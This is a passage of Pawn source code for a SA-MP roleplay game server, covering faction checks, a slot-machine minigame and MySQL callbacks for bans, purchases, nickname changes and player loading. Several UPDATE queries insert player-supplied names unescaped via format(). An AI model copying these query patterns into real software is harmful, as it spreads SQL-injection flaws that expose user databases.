		case F_BALLAS: format(string,sizeof(string),"Ballas");
		case F_RIFA: format(string,sizeof(string),"Rifa");
		case F_AZTEC: format(string,sizeof(string),"Aztecas");
		case F_VAGOS: format(string,sizeof(string),"Vagos");
	}
	return string;
}
stock SendFMes(fact, color, str[])
{
	if(fact == 11) fact = 9;
	else if(fact == 9) fact = 11;
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(pData[i][pFraction] == fact) SendClientMessage(i, color, str);
		else if((fact == 11 && pData[i][pFraction] == 9) || (fact == 9 && pData[i][pFraction] == 11)) SendClientMessage(i, color, str);
	}
	return true;
}
Convert(number)
{
	new hours = 0, mins = 0, secs = 0, string[50];
	hours = floatround(number / 3600);
	mins = floatround((number / 60) - (hours * 60));
	secs = floatround(number - ((hours * 3600) + (mins * 60)));
	if(hours > 0) format(string, sizeof(string), "%i:%02dm:%02ds", hours, mins, secs);
	else format(string, sizeof(string), "%i:%02d", mins, secs);
	return string;
}
stock GetPlayerID(string[])
{
    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
        if(IsPlayerConnected(i) == 1)
        {
            new testname[40];
            GetPlayerName(i, testname, sizeof(testname));
            if(strcmp(testname, string, true, strlen(string)) == 0) return i;
        }
    }
    return INVALID_PLAYER_ID;
}
stock settext(string[], const text[]) return strmid(string, text, 0, strlen(text), 255);
stock GetHouseZone(h)
{
	new zone[32],bool:getzone;
	for(new i=0; i<sizeof(gZoneInfo); i++)
    {
       	if(gHouses[h][houseX] >= gZoneInfo[i][SAZONE_AREA][0] && gHouses[h][houseX] <= gZoneInfo[i][SAZONE_AREA][3]
	   	&& gHouses[h][houseY] >= gZoneInfo[i][SAZONE_AREA][1] && gHouses[h][houseY] <= gZoneInfo[i][SAZONE_AREA][4])
       	{
        	settext(zone, gZoneInfo[i][SAZONE_NAME]);
        	getzone = true;
        	break;
       	}
    }
    if(!getzone) zone = "Неизвестно";
    return zone;
}
stock IsPlayerInBandOnline(bandid)
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(pData[i][pFraction] == bandid) return true;
	}
	return false;
}
stock IsAMer(playerid)
{
	new member = pData[playerid][pFraction];
	switch(member)
	{
		case 15: return true;
	}
	return false;
}
stock IsACop(playerid)
{
	new member = pData[playerid][pFraction];
	switch(member)
	{
		case 9, 11: return true;
	}
	return false;
}
stock IsAMafia(playerid)
{
	new member = pData[playerid][pFraction];
	switch(member)
	{
		case F_COL, F_MEX, F_YAK: return true;
	}
	return false;
}
forward GrainSTART(playerid);
public GrainSTART(playerid)
{
	new met[10];
	format(met,sizeof(met),"~y~+%d",GetPVarInt(playerid, "grains"));
    GameTextForPlayer(playerid, met, 2000, 1);
    pData[playerid][pDrugs] += GetPVarInt(playerid, "grains");
    Pokaz(playerid,4,GetPVarInt(playerid, "grains"),1);
    UpdatePlayerData(playerid,"drugs",pData[playerid][pDrugs]);
    DeletePVar(playerid,"grains");
    return true;
}
forward Kniga(playerid);
public Kniga(playerid)
{
    if(GetPVarInt(playerid, "yrok") == 1) {
        if(pData[playerid][pObraz1] < 100) pData[playerid][pObraz1] += 3, UpdatePlayerData(playerid,"obraz1",pData[playerid][pObraz1]);
    }
    if(GetPVarInt(playerid, "yrok") == 2) {
        if(pData[playerid][pObraz3] < 100) pData[playerid][pObraz3] += 3, UpdatePlayerData(playerid,"obraz3",pData[playerid][pObraz3]);
    }
    if(GetPVarInt(playerid, "yrok") == 3) {
        if(pData[playerid][pObraz4] < 100) pData[playerid][pObraz4] += 3, UpdatePlayerData(playerid,"obraz4",pData[playerid][pObraz4]);
    }
    GameTextForPlayer(playerid, "~y~+3", 1000, 1);
    SendClientMessage(playerid,CYELLOW,"Shen Sheasrule Davaleba.");
    SetPVarInt(playerid,"yrok",0);
	return true;
}
forward GETHP(playerid);
public GETHP(playerid)
{
	GetPlayerHealth(playerid,GMHP[playerid][1]);
	GetVehicleHealth(GetPlayerVehicleID(playerid),VEHHP[playerid][1]);
	if(!IsPlayerInAnyVehicle(playerid))
	{
		format(mes, sizeof(mes), "[A] {AFAFAF}GMCHECK %s[%d] | Iyo: %.1f HP. Gaxda: %.1f HP [Ping: %d]", Name2(playerid),playerid,GMHP[playerid][0],GMHP[playerid][1],GetPlayerPing(playerid));
		AdminChat(0xFFFF00FF,mes);
		SetPlayerHealthEx(playerid, GMHP[playerid][0]);
	}
	else
	{
		format(mes, sizeof(mes), "[A] {AFAFAF}GMCHECK %s[%d] | Iyo: %.1f HP. Gaxda: %.1f HP [Ping: %d] [IN CAR]", Name2(playerid),playerid,VEHHP[playerid][0],VEHHP[playerid][1],GetPlayerPing(playerid));
		AdminChat(0xFFFF00FF,mes);
		SetVehicleHealth(GetPlayerVehicleID(playerid),VEHHP[playerid][0]);
	}
}
stock IsALeader(playerid)
{
	new rang = pData[playerid][pRank];
	new fact = pData[playerid][pFraction]-1;
	if(pData[playerid][pSubfraction] && rang >= gFractionRankCount[fact]-1) return true;
	else if(!pData[playerid][pSubfraction] && rang == gFractionRankCount[fact]) return true;
	else return false;
}
stock GetString(param1[],param2[]) return !strcmp(param1, param2, false);
forward BombaOK(playerid);
public BombaOK(playerid)
{
    new objectid = GetPVarInt(playerid,"pgunobject");
    DeletePVar(playerid,"pgunobject");
    DestroyDynamicObject(objectid);
    RemovePlayerAttachedObject(playerid,0);
	RemovePlayerAttachedObject(playerid,1);
	SetPVarInt(playerid,"Detonator",1);
 	pData[playerid][pGunAmount] -= 500;
 	Pokaz(playerid,3,500,0);
  	SendClientMessage(playerid,CGREEN,"Tqven Warmatebit Daamzadet Xelnaketi Bombi. Gamosayeneblad: {ffffff}/bomba");
    SendClientMessage(playerid,CYELLOW,"Yuradgeba! Serverze Tavidan Shemosvlis Shemtxvevashi Tqveni Bombi Ar Damaxsovrdeba.");
}
forward Drugs(playerid);
public Drugs(playerid) return SetPlayerWeather(playerid, 14), SetPlayerDrunkLevel (playerid, 0), SetPVarInt(playerid,"DrugPRIN",0);
GoAnim(playerid,alib[],aanim[],Float:atime,amove,ax,ay,az,af,ac) return ApplyAnimation(playerid,alib,aanim,atime,amove,ax,ay,az,af,ac);
stock explode(aExplode[][], const sSource[], const sDelimiter[] = " ", iVertices = sizeof aExplode, iLength = sizeof aExplode[])
{
	new iNode,iPointer,iPrevious = -1,iDelimiter = strlen(sDelimiter);
	while(iNode < iVertices)
	{
		iPointer = strfind(sSource, sDelimiter, false, iPointer);
		if(iPointer == -1)
		{
			strmid(aExplode[iNode], sSource, iPrevious, strlen(sSource), iLength);
			break;
		}
		else strmid(aExplode[iNode], sSource, iPrevious, iPointer, iLength);
		iPrevious = (iPointer += iDelimiter);
		++iNode;
	}
	return iPrevious;
}
stock strrest(const string[], &index)
{
	new length = strlen(string), result[128];
	while ((index < length) && (string[index] <= ' ')) index++;

	new offset = index;
	while ((index < length) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
stock strtok(const string[], &index)
{
	new length = strlen(string), result[20];
	while ((index < length) && (string[index] <= ' ')) index++;

	new offset = index;
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
stock isNumeric(const string[])
{
	new length = strlen ( string );
	if ( length <= 0 ) return false;
	for (new i = 0; i < length; i++)
	{
		if (
		(string[i] > '9' || string[i] < '0' && string[i]!='-' && string[i]!='+')
		|| (string[i]=='-' && i!=0)
		|| (string[i]=='+' && i!=0)
		) return false;
	}
	if (length==1 && (string[0]=='-' || string[0]=='+')) return false;
	return true;
}
stock StatisticData(playerid)
{
    if(!IsPlayerConnected(playerid) || GetPVarInt(playerid,"Logined") == 0) return true;
    if(GetPVarInt(playerid,"StatisticD") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Moicadot..");
    SetPVarInt(playerid,"StatisticD",gettime()+5);

	new Float:health, Float:armour;
	GetPlayerHealth(playerid,health);
	SetProgressBarValue(qhealth2, health);
	ShowProgressBarForPlayer(playerid,qhealth2);

	GetPlayerArmour(playerid,armour);
	SetProgressBarValue(qhealth3, armour);
	ShowProgressBarForPlayer(playerid,qhealth3);

	SetProgressBarValue(qhealth4, pData[playerid][pHunger]/5);
	ShowProgressBarForPlayer(playerid,qhealth4);

	SetProgressBarValue(qhealth5, pData[playerid][pStamina]/5);
	ShowProgressBarForPlayer(playerid,qhealth5);

	SetProgressBarValue(qhealth6, pData[playerid][pPower]/5);
	ShowProgressBarForPlayer(playerid,qhealth6);

    TextDrawShowForPlayer(playerid, TextdrawStats);
	TextDrawShowForPlayer(playerid,Statistic[SkinPlayer]);
	TextDrawShowForPlayer(playerid,Statistic[SkinUpdate]);
	TextDrawShowForPlayer(playerid,Statistic[SkinWeapon]);
	TextDrawShowForPlayer(playerid,Statistic[SkinEatText]);
	TextDrawShowForPlayer(playerid,Statistic[SkinExit]);
	TextDrawShowForPlayer(playerid,Statistic[SkinText2]);
	for(new i=0; i < 8; i++) TextDrawShowForPlayer(playerid,Statistic[SkinText3][i]);
	OpenInventory(playerid);
	SelectTextDraw(playerid,0x1E90FFFF);
	//printf("Статистика открыта, потрачено %d (ms) | playerid: %d", GetTickCount() - time, playerid);
	return true;
}
stock SetString(param_1[], param_2[], size = 300) return strmid(param_1, param_2, 0, strlen(param_2), size);
PutPlayerInSlotMachine(playerid, firstBet=5000,  startBalance=0)
{
	if(Gambling[playerid] != G_STATE_NOT_GAMBLING) return true;

	Gambling[playerid] = G_STATE_READY;

	Slots[playerid][0] = random(5);
	Slots[playerid][1] = random(5);
	Slots[playerid][2] = random(5);

	ShowPlayerSlots(playerid,Slots[playerid][0],Slots[playerid][1],Slots[playerid][2]);

	Bet[playerid] = firstBet;

	TransferMoney(playerid,-1,startBalance);

	Balance[playerid] = startBalance;

	TogglePlayerControllable(playerid,0);

	SlotCounter[playerid] = 30+random(18);
    SlotTimer[playerid] = SetTimerEx("Gambler",100,1,"d",playerid);
    Gambling[playerid] = G_STATE_GAMBLING;
 	Balance[playerid]-=Bet[playerid];
	return true;
}

ShowPlayerSlots(playerid,slot1,slot2,slot3)
{
    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);


	TextDrawShowForPlayer(playerid,Digit1[slot1]);
	TextDrawShowForPlayer(playerid,Digit2[slot2]);
	TextDrawShowForPlayer(playerid,Digit3[slot3]);

	TextDrawShowForPlayer(playerid,Box);
}
HideSlotsForPlayer(playerid)
{
    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);

	TextDrawHideForPlayer(playerid,Box);
}
ExitPlayerFromSlotMachine(playerid)
{
	if(Gambling[playerid] == G_STATE_NOT_GAMBLING) return false;
	HideSlotsForPlayer(playerid);
	Gambling[playerid] = G_STATE_NOT_GAMBLING;
	TogglePlayerControllable(playerid,1);

	new str[128];
    if(Balance[playerid] > 0) format(str,sizeof(str),"~g~Your Balance: %d$",Balance[playerid]);
    else format(str,sizeof(str),"~r~You Lost Your Money. Stop Playing.",Balance[playerid]);
    GameTextForPlayer(playerid,str,5000,4);

    TransferMoney(-1,playerid,Balance[playerid]);
    return true;
}
forward Gambler(playerid);
public Gambler(playerid)
{
	if(Gambling[playerid] != G_STATE_GAMBLING)
	{
	    print("error: 15. (Ivan_Budko => Форум)");
	    KillTimer(SlotTimer[playerid]);
	    SlotTimer[playerid] = -1;
	    Gambling[playerid] = G_STATE_NOT_GAMBLING;
	    return false;
	}
	SlotCounter[playerid] -= 1;

	new slot = SlotCounter[playerid];
	if(slot < 10) Slots[playerid][2]+=random(3)+1;
	else if(slot < 20)
	{
	    Slots[playerid][1]+=random(3)+1;
	    Slots[playerid][2]+=random(3)+1;
	}
	else
	{
	    Slots[playerid][0]+=random(3)+1;
	    Slots[playerid][1]+=random(3)+1;
	    Slots[playerid][2]+=random(3)+1;
	}
	if(Slots[playerid][0] >= 6) Slots[playerid][0] = 0;
	if(Slots[playerid][1] >= 6) Slots[playerid][1] = 0;
	if(Slots[playerid][2] >= 6) Slots[playerid][2] = 0;

	ShowPlayerSlots(playerid,Slots[playerid][0],Slots[playerid][1],Slots[playerid][2]);

	if(SlotCounter[playerid] == 0)
	{
	    KillTimer(SlotTimer[playerid]);
	    SlotTimer[playerid] = -1;
		Gambling[playerid] = G_STATE_DISPLAY;

		SetTimerEx("PlayAgainTimer",3000,false,"i",playerid);

	    if(Slots[playerid][0] == Slots[playerid][1] && Slots[playerid][0] == Slots[playerid][2])
	    {
	        new Multiplier=1;

	        switch(Slots[playerid][0])
	        {
	            case 0: Multiplier = 10000;    // Cherries
	            case 1: Multiplier = 30000;   // Grapes
	            case 2: Multiplier = 60000;   // 69's
	            case 3: Multiplier = 200000;   // Bells
	            case 4: Multiplier = 500000;  // Bar
	            case 5: Multiplier = 700000;  // Double Bars
	        }

	        new money = floatround(Bet[playerid] + Multiplier * 1.0);
	        new str[128];
	        format(str,sizeof(str),"~w~Winner: ~g~%d$~w~!",money);
	        GameTextForPlayer(playerid,str,5000,4);

	        Balance[playerid] += money;

	        Slots[playerid][0] = random(5);
			Slots[playerid][1] = random(5);
			Slots[playerid][2] = random(5);
	    }
	    else
	    {
	        if(Slots[playerid][0] == Slots[playerid][1] || Slots[playerid][1] == Slots[playerid][2] || Slots[playerid][0] == Slots[playerid][2]) GameTextForPlayer(playerid,"Almost!",3000,4);
	        else GameTextForPlayer(playerid,"Bad Luck!",3000,4);
	    }
	    return true;
	}
	return false;
}

forward PlayAgainTimer(playerid);
public PlayAgainTimer(playerid) ExitPlayerFromSlotMachine(playerid);
stock IsVehicleOccupied(vehicleid)
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(IsPlayerInVehicle(i,vehicleid))
		return true;
	}
	return false;
}
forward mysql_OffAdmins(playerid);
public mysql_OffAdmins(playerid){
	new rows = cache_get_row_count(mysql);
	new str[2048], names[MAX_PLAYER_NAME], level, vxod[32];
	format(str, sizeof(str), "Motamashis Saxeli - Admin - Naxva\n\n{FFFFFF}");
	while(rows--){
		cache_get_field_content(rows, "nickname", names, mysql);
		cache_get_field_content(rows, "last", vxod, mysql);
		level = cache_get_field_content_int(rows, "admin", mysql);
		format(str, sizeof(str), "%s%s - %d - %s\n",str,names, level, vxod);
	}
	ShowPlayerDialog(playerid, dOffMembers, 0, "OFFADMINS", str, "Migeba", "");
	return true;
}
forward mysql_offplayer(playerid, player_name[]);
public mysql_offplayer(playerid, player_name[]){
	if(!cache_affected_rows(mysql))
		return SendClientMessage(playerid,CGRAY,"Motamashe Am Saxelit Ar Aris Tqvens Organizaciashi..");
	new query[144];
	format(query, sizeof(query), "[A] %s Gaagdo Offline Motamashe %s",Name2(playerid), player_name);
	AdminChat(CGREEN,query);
	return true;
}
forward mysql_geton(playerid);
public mysql_geton(playerid){
	if(!cache_get_row_count(mysql)) return SendClientMessage(playerid,CGRAY,"Araswori Saxeli");
	new Names[MAX_PLAYER_NAME],vxod[32];
	cache_get_field_content(0, "nickname", Names, mysql);
	cache_get_field_content(0, "last", vxod, mysql);
	format(mes,sizeof(mes),"Последнее посещение: %s, Name: %s",vxod, Names);
	SendClientMessage(playerid,CGREEN,mes);
	return true;
}
forward mysql_getip(playerid);
public mysql_getip(playerid){
    if(!cache_get_row_count(mysql)) return SendClientMessage(playerid,CGRAY,"Araswori Saxeli");
	new ipka[32],Names[MAX_PLAYER_NAME];
	cache_get_field_content(0, "nickname", Names, mysql);
	cache_get_field_content(0, "ip", ipka, mysql);
	format(mes,sizeof(mes),"IP Adress: %s, Name: %s",ipka, Names);
	SendClientMessage(playerid,CGREEN,mes);
	return true;
}
forward mysql_unban(playerid, player_name[]);
public mysql_unban(playerid, player_name[]){
	if(!cache_get_row_count(mysql)) return SendClientMessage(playerid,CGRAY,"Araswori Saxeli");
	new query[128];
	format(query,sizeof(query),"UPDATE `members` SET `ban` = '0' WHERE `nickname`='%s'",player_name);
	mysql_empty(mysql, query);

	format(query,sizeof(query),"[A] %s Unbanned %s",Name2(playerid),player_name);
	AdminChat(CORANGE,query);
	printf("%s unbanned %s",Name2(playerid),player_name);
	return true;
}
forward mysql_uninviteoff(playerid, player_name[]);
public mysql_uninviteoff(playerid, player_name[]){
	if(!cache_affected_rows(mysql))
		return SendClientMessage(playerid,CGRAY,"Motamashe Am Saxelit Ar Aris Tqvens Organizaciashi.");
	new query[144];
	format(query, sizeof(query), "Organizaciis Liderma %s Gaagdo Offline Motamashe %s",Name2(playerid), player_name);
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(pData[i][pFraction] == pData[playerid][pFraction])
		{
			if(pData[playerid][pSubfraction] && pData[i][pSubfraction] == pData[playerid][pSubfraction])
			{
				SendClientMessage(i,CORANGE, query);
				continue;
			}
			if(!pData[playerid][pSubfraction])
			{
				SendClientMessage(i,CORANGE, query);
				continue;
			}
		}
	}
	return true;
}
forward mysql_OffMembers(playerid);
public mysql_OffMembers(playerid){
	new rows = cache_get_row_count(mysql);
	new str[2048], Names[MAX_PLAYER_NAME],Level, Level1, Vxod[32];
	format(str, sizeof(str), "Gamocdileba\tMotamashi Saxeli\tRanki\tNaxva\n\n");
	while(rows--){
		cache_get_field_content(rows, "nickname", Names, mysql);
		cache_get_field_content(rows, "last", Vxod, mysql);
		Level = cache_get_field_content_int(rows, "rank", mysql);
		Level1 = cache_get_field_content_int(rows, "level", mysql);
		format(str, sizeof(str), "%s%d\t%s\t\t%d\t%s\n",str,Level1, Names, Level, Vxod);
	}
	ShowPlayerDialog(playerid, dOffMembers, 0, "OFFMEMBERS", str, "Принять", "");
	return true;
}
stock mysql_BuyCar(playerid, modelid, color1, color2, houseid, price, idd)
{
	new query[400];
	format(query,sizeof(query),"UPDATE `members` SET `car` = '%d',`color1` = '%d',`color2` = '%d',`fuel` = '100',`carid` = '%d' WHERE `nickname` = '%s'",modelid,color1,color2,idd,Name2(playerid));
	mysql_empty(mysql, query);
	pData[playerid][pCarID] = idd;
	pData[playerid][pCar] = modelid;
	pData[playerid][pFuel] = 100;
	pData[playerid][pColor1] = color1;
	pData[playerid][pColor2] = color2;
	if(houseid >= 0)
	{
		new vehicleid = CreateVehicle(pData[playerid][pCar],gHouses[houseid][houseParkX],gHouses[houseid][houseParkY],gHouses[houseid][houseParkZ],gHouses[houseid][houseParkR],pData[playerid][pColor1],pData[playerid][pColor2],-1);
        gVehicles[pData[playerid][pHouse]][vvID] = vehicleid;
		gVehicles[vehicleid-1][vLock] = 1;
		gVehicles[vehicleid-1][vFuel] = pData[playerid][pFuel];
		gVehicles[vehicleid-1][vX] = gHouses[houseid][houseParkX];
		gVehicles[vehicleid-1][vY] = gHouses[houseid][houseParkY];
		gVehicles[vehicleid-1][vZ] = gHouses[houseid][houseParkZ];
		gVehicles[vehicleid-1][vProbability2] = 1;
	}
	SendClientMessage(playerid,CGREEN,"Gilocavt, Tqven Iyidet Avtomobili. Is Gachndeba Saxlshi");
	TransferMoney(playerid,-1,price);
	return true;
}
forward mysql_dShop(playerid, number, id, price);
public mysql_dShop(playerid, number, id, price){
	if(cache_get_row_count(mysql)){
		SendClientMessage(playerid,CRED,"Es Nomeri Ukve Gamoyenebulia");
		ShowPlayerDialog(playerid,dShopSim,1,"Nomris Yidva","{ffffff}Miutite Nomeri Romlis Yidvac Gsurs (6 Cifri):\n","NEXT","CLOSE");
	}else{
		pData[playerid][pPhone] = number;
		UpdatePlayerData(playerid,"phone",pData[playerid][pPhone]);
		gBusiness[id][busiProduct] -= gShopProduct[0];
		TransferMoney(playerid,-1,price);
		gBusiness[id][busiBank] += price;
		UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
		UpdateBusinessText(id);
		format(mes,sizeof(mes),"Gilocavt, Tqven Iyidet Telefoni. Tqveni Nomeri: %d",pData[playerid][pPhone]);
		SendClientMessage(playerid,CGREEN,mes);
		SendClientMessage(playerid,CGREEN,"Yvela Zari Da SMS Droebit Ufasoa");
	}
	return true;
}
forward mysql_dDonateNickname1(playerid, nickname[]);
public mysql_dDonateNickname1(playerid, nickname[]){
	if(cache_get_row_count(mysql)){
		SendClientMessage(playerid,CGRAY,"Es Saxeli Ukve Registrirebulia");
		OnPlayerCommandText(playerid,"/donate");
	}else{
		SetPVarString(playerid,"nnick",nickname);
		format(mes,sizeof(mes),"{"#cWHITE"}Axali Saxeli: {"#cBLUE"}%s{"#cWHITE"}.\n\t\tGaagrdzelebt?",nickname,pData[playerid][pDonate] - 60);
		ShowPlayerDialog(playerid,dDonateNickname2,0,"Saxelis Shecvla",mes,"YES","NO");
	}
	return true;
}
forward mysql_dDonateNickname2(playerid, nickname[]);
public mysql_dDonateNickname2(playerid, nickname[]){
	if(cache_get_row_count(mysql)){
		SendClientMessage(playerid,CGRAY,"Es Saxeli Ukve Registrirebulia");
		OnPlayerCommandText(playerid,"/donate");
	}else{
		if(pData[playerid][pDonate] < 0) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Sakmarisi Donate Money");
		if(SetPlayerName(playerid,nickname) == -1)
		{
			OnPlayerCommandText(playerid,"/donate");
			return SendClientMessage(playerid,CGRAY,"Shen Miutite Akrdzaluli Simbolo");
		}
		if(pData[playerid][pHouse])
		{
			new query[128];
			new houseid = pData[playerid][pHouse] - 1;
			if(GetString(Name2(playerid),gHouses[houseid][houseOwner]))
			{
				//format(gHouses[houseid][houseOwner],MAX_PLAYER_NAME,"%s",nickname);
				SetString(gHouses[houseid][houseOwner],nickname);
				format(query,sizeof(query),"UPDATE `houses` SET `owner` = '%s' WHERE `id` = '%d'",nickname,houseid+1);
				mysql_empty(mysql, query);
			}
		}
		pData[playerid][pDonate] -= 0;
		new query[128];
		format(query,sizeof(query),"UPDATE `members` SET `nickname` = '%s', `donate` = '%d' WHERE `id` = '%d'",nickname,pData[playerid][pDonate],pData[playerid][pMysqlID]);
		mysql_empty(mysql, query);
		format(query,sizeof(query),"Sheni Saxeli Sheicvala: {"#cWHITE"}%s",nickname);
		SendClientMessage(playerid,CGREEN,query);
		SendClientMessage(playerid,CSYSTEM,"Shemodi Axali Saxelit");
		format(query,sizeof(query),"[A] %s => %s",Name2(playerid),nickname);
		AdminChat(CORANGE,query);
		DonateLog(playerid,-30,8);
		NewKick(playerid);
	}
	return true;
}
forward mysql_LoadPlayerData(playerid);
public mysql_LoadPlayerData(playerid) {
   	pData[playerid][pMysqlID] = cache_get_field_content_int(0, "id", mysql);
	cache_get_field_content(0, "nickname", Name2(playerid), mysql, 64);
	cache_get_field_content(0, "password", pData[playerid][pPassword], mysql, 64);
	pData[playerid][pWarn] = cache_get_field_content_int(0, "warn", mysql);
	pData[playerid][pBan] = cache_get_field_content_int(0, "ban", mysql);
	pData[playerid][pMut] = cache_get_field_content_int(0, "mut", mysql);
	pData[playerid][pSex] = cache_get_field_content_int(0, "sex", mysql);
	pData[playerid][pAge] = cache_get_field_content_int(0, "age", mysql);
	pData[playerid][pSkin] = cache_get_field_content_int(0, "skin", mysql);
	pData[playerid][pSkin2] = cache_get_field_content_int(0, "skin2", mysql);
	pData[playerid][pFractionSkin] = cache_get_field_content_int(0, "fractionskin", mysql);
	pData[playerid][pHealth] = cache_get_field_content_float(0, "health", mysql);
	pData[playerid][pArmour] = cache_get_field_content_float(0, "armour", mysql);
	pData[playerid][pHunger] = cache_get_field_content_int(0, "hunger", mysql);
	pData[playerid][pStamina] = cache_get_field_content_int(0, "stamina", mysql);
	pData[playerid][pPower] = cache_get_field_content_int(0, "power", mysql);
	pData[playerid][pBolnica] = cache_get_field_content_int(0, "Bolnica", mysql);
	pData[playerid][pHouse] = cache_get_field_content_int(0, "house", mysql);
	pData[playerid][pCar] = cache_get_field_content_int(0, "car", mysql);
	pData[playerid][pJob] = cache_get_field_content_int(0, "job", mysql);
	pData[playerid][pMoney] = cache_get_field_content_int(0, "money", mysql);
	pData[playerid][pBank] = cache_get_field_content_int(0, "bank", mysql);
	pData[playerid][pLevel] = cache_get_field_content_int(0, "level", mysql);
	pData[playerid][pExp] = cache_get_field_content_int(0, "exp", mysql);
	pData[playerid][pPhone] = cache_get_field_content_int(0, "phone", mysql);
	pData[playerid][pWanted] = cache_get_field_content_int(0, "wanted", mysql);
	pData[playerid][pJail] = cache_get_field_content_int(0, "jail", mysql);
	pData[playerid][pPrison] = cache_get_field_content_int(0, "prison", mysql);
	pData[playerid][pDrugs] = cache_get_field_content_int(0, "drugs", mysql);
	pData[playerid][pGrain] = cache_get_field_content_int(0, "grain", mysql);
	pData[playerid][pAmmo] = cache_get_field_content_int(0, "ammo", mysql);
	pData[playerid][pGunAmount] = cache_get_field_content_int(0, "gunamount", mysql);
	pData[playerid][pFraction] = cache_get_field_content_int(0, "fraction", mysql);
	pData[playerid][pSubfraction] = cache_get_field_content_int(0, "subfraction", mysql);
	pData[playerid][pRank] = cache_get_field_content_int(0, "rank", mysql);
	pData[playerid][pBusiness] = cache_get_field_content_int(0, "bussiness", mysql);
	pData[playerid][pWatch] = cache_get_field_content_int(0, "watch", mysql);
	cache_get_field_content(0, "code", pData[playerid][pCode], mysql, 64);
	pData[playerid][pRequestCode] = cache_get_field_content_int(0, "requestcode", mysql);
	pData[playerid][pLicenses][LIC_DRIVING] = cache_get_field_content_int(0, "licDrive", mysql);
	pData[playerid][pLicenses][LIC_FLY] = cache_get_field_content_int(0, "licFly", mysql);
	pData[playerid][pLicenses][LIC_BOAT] = cache_get_field_content_int(0, "licBoat", mysql);
	pData[playerid][pLicenses][LIC_WEAP] = cache_get_field_content_int(0, "licWeap", mysql);
	pData[playerid][pObraz1] = cache_get_field_content_int(0, "Obraz1", mysql);
	pData[playerid][pObraz3] = cache_get_field_content_int(0, "Obraz3", mysql);
	pData[playerid][pObraz4] = cache_get_field_content_int(0, "Obraz4", mysql);
	pData[playerid][pSpawn] = cache_get_field_content_int(0, "spawn", mysql);
	pData[playerid][pAdmin] = cache_get_field_content_int(0, "admin", mysql);
	pData[playerid][pHelper] = cache_get_field_content_int(0, "helper", mysql);
	pData[playerid][pStatus] = cache_get_field_content_int(0, "status", mysql);
	pData[playerid][pDonate] = cache_get_field_content_int(0, "donate", mysql);
	pData[playerid][pArmyTime] = cache_get_field_content_int(0, "armytime", mysql);
	pData[playerid][pArmyRank] = cache_get_field_content_int(0, "armyrank", mysql);
	cache_get_field_content(0, "divorce", pData[playerid][pDivorce], mysql, 64);
	pData[playerid][pColor1] = cache_get_field_content_int(0, "color1", mysql);
	pData[playerid][pColor2] = cache_get_field_content_int(0, "color2", mysql);
	pData[playerid][pFuel] = cache_get_field_content_float(0, "fuel", mysql);
	pTemp[playerid][pEda][0] = cache_get_field_content_int(0, "burger", mysql);
	pTemp[playerid][pEda][1] = cache_get_field_content_int(0, "salad", mysql);
	pTemp[playerid][pEda][2] = cache_get_field_content_int(0, "pizza", mysql);
	pTemp[playerid][pEda][3] = cache_get_field_content_int(0, "sprunk", mysql);
	pTemp[playerid][pEda][4] = cache_get_field_content_int(0, "beer", mysql);
	pTemp[playerid][pEda][5] = cache_get_field_content_int(0, "vodka", mysql);
	pTemp[playerid][pEda][6] = cache_get_field_content_int(0, "brandy", mysql);
	pTemp[playerid][pEda][7] = cache_get_field_content_int(0, "wine", mysql);
	pTemp[playerid][pEda][8] = cache_get_field_content_int(0, "shawarma", mysql);
	pData[playerid][pOfforg] = cache_get_field_content_int(0, "offorg", mysql);
	pData[playerid][pOffrang] = cache_get_field_content_int(0, "offrang", mysql);
	pData[playerid][pOtel] = cache_get_field_content_int(0, "otel", mysql);
	pData[playerid][pOtelNomer] = cache_get_field_content_int(0, "otelnomer", mysql);
	pData[playerid][pCarID] = cache_get_field_content_int(0, "carid", mysql);
